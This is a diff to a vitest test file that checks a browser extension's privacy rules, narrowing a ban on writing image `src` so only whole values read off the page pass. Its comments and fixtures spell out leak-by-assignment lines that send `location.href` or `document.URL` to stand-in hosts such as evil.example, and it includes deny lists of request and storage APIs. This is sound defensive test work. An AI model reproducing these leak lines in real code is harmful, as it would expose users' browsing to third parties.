@@ -1,7 +1,7 @@
 import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
 import type { Rules } from './surface.js';
-import { modulesIn, surfaceOf, why } from './surface.js';
+import { givenTo, modulesIn, surfaceOf, why } from './surface.js';
 
 const src = fileURLToPath(new URL('../src', import.meta.url));
 
@@ -98,8 +98,21 @@ const GLOBALS = new Set([
  * two candidates that differed only in a directory as one file. It shows the
  * path now, and asks `startsWith` the one question that separates a path from a
  * `data:` payload: whether it opens with a slash.
+ *
+ * `addEventListener` and `scrollIntoView` are the pointing half, and they are
+ * the two entries that read like a reach into the page. Neither is.
+ * `addEventListener` is only ever called on a node the panel made inside its
+ * own closed root — `pointing.test.ts` walks the page and finds none — so it
+ * registers nothing that outlives the host's removal, and `dormant.test.ts`
+ * refuses the event names that would fire without a click.
+ * `scrollIntoView` is the one thing on this list that reaches a page element,
+ * and it changes the page's scroll offset and nothing else: no style, no
+ * class, no attribute. The issue asks for it in those words — "clicking a row
+ * brings that image into view" — so it is a sanctioned change rather than a
+ * tolerated one.
  */
 const CALLED = new Set([
+  'addEventListener',
   'addListener',
   'appendChild',
   'attachShadow',
@@ -118,6 +131,7 @@ const CALLED = new Set([
   'querySelectorAll',
   'remove',
   'round',
+  'scrollIntoView',
   'slice',
   'startsWith',
   'then',
@@ -131,17 +145,70 @@ const CALLED = new Set([
  * The tightest of the three lists and the one that matters most, because
  * writing a property is how the panel would leak a page without ever calling
  * anything: `img.src = 'https://…/?' + location.href` is a request, made by
- * assignment, with no name any list of dangerous APIs would hold. Two names is
- * the whole panel: the host's id, and the words it says.
+ * assignment, with no name any list of dangerous APIs would hold.
  *
- * Two, still, and that is the one number in this file that did not move when
- * the panel started explaining a page. It is also why the panel's elements are
- * semantic ones and its stylesheet selects on tag names: a class name would be
- * a third written property for nothing a `dl` does not already give, and
- * `innerHTML` would be a third that undoes the whole of the escaping story.
- * `escaping.test.ts` refuses that one by name as well as by absence.
+ * It was two names for two slices — the host's id and the words it says — and
+ * it is six now, because the panel draws a thumbnail and holds two
+ * disclosures. Each is written on an element the panel made and nowhere else,
+ * and the four new ones divide sharply:
+ *
+ * `alt`, `title` and `open` carry text and a boolean. None of them can name a
+ * destination in any browser: an `alt` is read aloud, a `title` is a tooltip,
+ * an `open` is a disclosure's state. They are here because the panel now says
+ * what a thumbnail shows where it will not draw, what the cache mark means
+ * where the mark is, and that the card starts open — and every one of those is
+ * something the platform's own element does with no class name and no script.
+ *
+ * `src` is the one that is a request, and it is the reason `WHOLE` below
+ * exists. It is not allowed here as a name a contributor may write freely: the
+ * only value it may take is a whole value that arrived from the reading, which
+ * is a claim about the assignment rather than about the property, and it is
+ * checked as one.
+ *
+ * `innerHTML` is still refused, by absence here and by name in
+ * `escaping.test.ts`, and the class name is still not here — which is why the
+ * panel's elements are semantic ones and its stylesheet selects on tag names.
  */
-const WRITTEN = new Set(['id', 'textContent']);
+const WRITTEN = new Set(['alt', 'id', 'open', 'src', 'textContent', 'title']);
+
+/**
+ * Properties whose value may only ever be a whole value read off something.
+ *
+ * The narrowing, written down. `src` used to be refused outright, on the
+ * argument that an assignment is the leak no denylist of API names catches:
+ * `pixel.src = 'https://evil.example/p?' + location.href` calls nothing, names
+ * nothing dangerous, and hands a third party the address of the page a reader
+ * was looking at. That argument is untouched. What changed is that a panel
+ * whose whole job is "which image is this row about" is far better at it with
+ * the image in the row, and the maintainer asked for one.
+ *
+ * So the refusal changed shape instead of going away. A `src` may be written,
+ * and the only thing it may be written is a value the code did not build: an
+ * identifier, or one property read off something. That is what a leak cannot
+ * be. Every route out needs a URL with a fact stitched into it — a
+ * concatenation, a template literal, an interpolated `location.href`, a query
+ * appended to a real candidate — and every one of those is an expression this
+ * check can see is not a plain read.
+ *
+ * What survives, stated as plainly as it can be: the thumbnail asks for a file
+ * the page has already asked for, from a host the page has already contacted,
+ * so nothing reaches anywhere it had not already reached. And because the
+ * value is whole, no fact about the page — its URL, its base, its title, which
+ * images it has — can be encoded into the request. The chain is two links long
+ * and the test below names both: `read.ts` takes `currentSrc` off the page's
+ * own image, `explain.ts` carries it as `file`, and `panel.ts` assigns
+ * `row.file`. Nothing in the middle touches it.
+ *
+ * The check reads the shape of one expression, so a value laundered through a
+ * function call — `pixel.src = leak(what)` — is a read of `leak(what)` and not
+ * a plain one, which it refuses. A value laundered through a variable is the
+ * hole: `const url = base + what; pixel.src = url` is a plain identifier. The
+ * allowlists above are what narrow that — `location` is not a name this
+ * package may reach, and `DESTINATIONS` refuses the string half.
+ */
+const WHOLE: Rules = [
+  [/^src$/, 'a src is only ever a whole URL that arrived from the reading'],
+];
 
 /**
  * Names refused by name as well as by absence from the allowlists above.
@@ -154,11 +221,16 @@ const WRITTEN = new Set(['id', 'textContent']);
  * name because the call in front of them seemed harmless — so each names the
  * route rather than every spelling of it, and the failing line says which list
  * stopped it.
+ *
+ * `src` left the third rule and did not leave the file: `WHOLE` above is where
+ * it went, and it is refused there on the shape of what it is given rather
+ * than on its name. Its four siblings stay refused outright, because the panel
+ * has no thumbnail's worth of reason to write any of them.
  */
 const LEAKS: Rules = [
   [/^(?:fetch|XMLHttpRequest|WebSocket|sendBeacon)$/, 'a way to make a request'],
   [/^(?:localStorage|sessionStorage|indexedDB|setItem)$/, 'a place to keep page data'],
-  [/^(?:src|srcset|href|action|poster)$/, 'a request made by assignment'],
+  [/^(?:srcset|href|action|poster)$/, 'a request made by assignment'],
 ];
 
 /** The one path off `chrome` that would keep something. */
@@ -195,6 +267,15 @@ function findings(text: string): string[] {
   const surface = surfaceOf(text);
   const found = [
     ...surface.refused,
+    ...WHOLE.flatMap(([pattern, reason]) =>
+      [...WRITTEN]
+        .filter((name) => pattern.test(name))
+        .flatMap((name) =>
+          givenTo(text, name)
+            .filter((given) => !given.whole)
+            .map((given) => `gives ${name} the value ${given.wrote}, and ${reason}`),
+        ),
+    ),
     ...surface.globals.map((name) => refused('reaches', name, GLOBALS, LEAKS)),
     ...surface.called.map((name) => refused('calls', name, CALLED, LEAKS)),
     ...surface.written.map((name) => refused('writes', name, WRITTEN, LEAKS)),
@@ -272,16 +353,44 @@ describe('the extension, checked against storing or sending anything', () => {
     expect([...reached].sort()).toEqual([...GLOBALS].sort());
   });
 
-  it('calls twenty-three properties, and no others', () => {
+  it('calls twenty-five properties, and no others', () => {
     const calls = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).called));
 
     expect([...calls].sort()).toEqual([...CALLED].sort());
   });
 
-  it('writes two properties, and no others', () => {
+  it('writes six properties, and no others', () => {
     const writes = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).written));
 
     expect([...writes].sort()).toEqual([...WRITTEN].sort());
+  });
+
+  it('assigns a src once, and assigns it a whole value off the row', () => {
+    // The narrowing, pinned as a chain rather than as a rule about intent.
+    // `read.ts` takes `currentSrc` off the page's own image, `explain.ts`
+    // carries it under `file`, `panel.ts` gives it to the thumbnail — and every
+    // link is a plain read, so there is nowhere along it for a fact about the
+    // page to be stitched in. Asserted by the text of each expression, because
+    // "whole" is a shape and the shape is the guarantee.
+    const given = Object.entries(modules).flatMap(([name, text]) =>
+      givenTo(text, 'src').map((one) => `${name} gives src ${one.wrote}, whole: ${one.whole}`),
+    );
+
+    expect(given).toEqual(['panel.ts gives src row.file, whole: true']);
+    expect(givenTo(modules['explain.ts'] ?? '', 'file')).toEqual([
+      { wrote: 'image.currentSrc', whole: true },
+    ]);
+    expect(givenTo(modules['explain.ts'] ?? '', 'currentSrc')).toEqual([
+      { wrote: 'raw.currentSrc', whole: true },
+    ]);
+    // The first link, and the one place the chain is not a single read: the
+    // reader falls back from the file the browser chose to the `src` the page
+    // wrote. Both halves are reads off the same element and nothing is built
+    // out of them, which is the property — a fallback between two of the
+    // page's own values cannot carry a fact the page did not already have.
+    expect(givenTo(modules['read.ts'] ?? '', 'currentSrc')).toEqual([
+      { wrote: 'img.currentSrc || img.src', whole: false },
+    ]);
   });
 
   it('names no destination anywhere, in a string or otherwise', () => {
@@ -307,11 +416,14 @@ describe('the privacy check, given an extension that keeps or sends something', 
   it('catches a leak made by assignment, which no list of dangerous calls holds', () => {
     // The case that earns its keep. Everything else a panel could do to send a
     // page somewhere goes through a name — `fetch`, `sendBeacon`, a socket —
-    // and the four-name allowlist above refuses all of them by absence. This
-    // one calls nothing: it builds an element the page never sees, writes a
-    // URL into a property, and the browser makes the request on its behalf.
-    // `WRITTEN` is the list that stops it, which is why that list is two names
-    // long.
+    // and the allowlist above refuses all of them by absence. This one calls
+    // nothing: it builds an element the page never sees, writes a URL into a
+    // property, and the browser makes the request on its behalf.
+    //
+    // It used to be caught by `src` being refused outright. It is caught now
+    // by the shape of what `src` was given — a concatenation is not a whole
+    // value that arrived from the reading — which is the narrowing the
+    // thumbnail cost and the whole of what it cost.
     expect(
       findings(
         [
@@ -321,7 +433,80 @@ describe('the privacy check, given an extension that keeps or sends something', 
           '};',
         ].join('\n'),
       ),
-    ).toEqual(['writes src, which is a request made by assignment', 'writes a string naming a URL']);
+    ).toEqual([
+      'gives src the value "https://imgwhy.example/p?" + what, and a src is only ever a whole ' +
+        'URL that arrived from the reading',
+      'writes a string naming a URL',
+    ]);
+  });
+
+  /**
+   * Every way a leak could be dressed as a thumbnail.
+   *
+   * Held here rather than tried on a branch and reverted, so the failure each
+   * one should cause is a passing test instead of a note in a commit message.
+   * Every entry is a `src` a panel may legitimately want to write and may not:
+   * the value is one it built, and a value the code built is a value a fact
+   * about the page can be stitched into. The last is the sharpest — it starts
+   * from a real candidate URL the reading did hand over, which is exactly the
+   * edit somebody would make believing it stayed within the rule.
+   */
+  const dressed: [string, string, string][] = [
+    [
+      'a concatenation onto a URL the code wrote',
+      'thumb.src = "https://evil.example/p?" + row.file;',
+      '"https://evil.example/p?" + row.file',
+    ],
+    [
+      'a template literal, which is a concatenation with nicer punctuation',
+      'thumb.src = `${row.file}?from=${where}`;',
+      '`${row.file}?from=${where}`',
+    ],
+    [
+      'the page’s own address interpolated into a real host',
+      'thumb.src = `https://cdn.example.net/t?at=${location.href}`;',
+      '`https://cdn.example.net/t?at=${location.href}`',
+    ],
+    [
+      'a query appended to a candidate the reading did hand over',
+      'thumb.src = row.file + "?ref=" + document.URL;',
+      'row.file + "?ref=" + document.URL',
+    ],
+    [
+      'a value laundered through a call, which is not a read of anything',
+      'thumb.src = shrink(row.file);',
+      'shrink(row.file)',
+    ],
+    [
+      'a compound assignment, which builds on what was already there',
+      'thumb.src += row.file;',
+      'row.file',
+    ],
+  ];
+
+  it.each(dressed)('catches %s', (_route, line, wrote) => {
+    const [given] = givenTo(`export const draw = (thumb, row) => { ${line} };`, 'src');
+
+    expect(given).toEqual({ wrote, whole: false });
+    expect(findings(`export const draw = (thumb, row) => { ${line} };`)).toContain(
+      `gives src the value ${wrote}, and a src is only ever a whole URL that arrived from the ` +
+        'reading',
+    );
+  });
+
+  it('is quiet about the one assignment the panel makes', () => {
+    // The shipped line, read by the same check. A whole value off the row is
+    // the only thing that passes, and it is what the panel writes.
+    expect(givenTo('export const draw = (thumb, row) => { thumb.src = row.file; };', 'src')).toEqual(
+      [{ wrote: 'row.file', whole: true }],
+    );
+    expect(findings('export const draw = (thumb, row) => { thumb.src = row.file; };')).toEqual([]);
+  });
+
+  it('reads a src written around the dot, which a check on one spelling would miss', () => {
+    expect(
+      givenTo('export const draw = (thumb, row) => { thumb["src"] = row.file + "?x"; };', 'src'),
+    ).toEqual([{ wrote: 'row.file + "?x"', whole: false }]);
   });
 
   it('refuses a way out even where an allowlist has been loosened', () => {
